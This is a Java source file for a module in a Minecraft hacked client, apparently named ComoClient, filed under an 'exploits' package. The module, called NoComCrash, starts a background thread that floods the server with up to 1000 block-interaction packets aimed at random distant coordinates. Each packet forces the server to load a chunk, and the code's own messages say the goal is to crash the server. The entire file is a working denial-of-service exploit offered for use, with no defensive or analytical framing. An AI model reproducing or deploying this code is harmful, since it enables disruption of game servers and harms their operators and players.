package net.como.client.modules.exploits;

import java.util.Random;

import net.como.client.ComoClient;
import net.como.client.structures.Module;
import net.como.client.structures.settings.Setting;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class NoComCrash extends Module {

    public NoComCrash() {
        super("NoComCrash");
        this.description = "Hits lots of blocks in random locations causing chunks to be loaded.";
    
        this.addSetting(new Setting("Amount", 1000));
    }

    private Random random = new Random();
    private Vec3d randomPosition() {
        int k = 16777215;

        return new Vec3d(
            random.nextInt(k),
            255,
            random.nextInt(k)
        );
    }

    private Integer totalPackets = 0;

    @Override
    public String listOption() {
        return String.format("%d%%", (int)((float)totalPackets/(float)this.getIntSetting("Amount") * 100));
    }

    @Override
    public void activate() {
        int amount = this.getIntSetting("Amount");
        totalPackets = 0;

        this.displayMessage("Initialising thread...");
        Thread thread = new Thread(() -> {
            this.displayMessage("Starting to crash server...");
            try {
                for (int i = 0; i < amount && ComoClient.me() != null && this.isEnabled(); i++) {
                    Vec3d randPos = this.randomPosition();
                    totalPackets = i;

                    PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(randPos, Direction.UP, new BlockPos(randPos), false));
                    ComoClient.me().networkHandler.sendPacket(packet);

                    Thread.sleep(10);
                }
            } catch (Exception e) {
                this.displayMessage(String.format("Failed to crash (Exception %s Raised)", e.getClass().getSimpleName()));
            }

            if (this.isEnabled()) {
                this.displayMessage("Finished!");
                this.disable();
            } else {
                this.displayMessage("Aborted!");
            }
        });

        thread.start();
    }
}
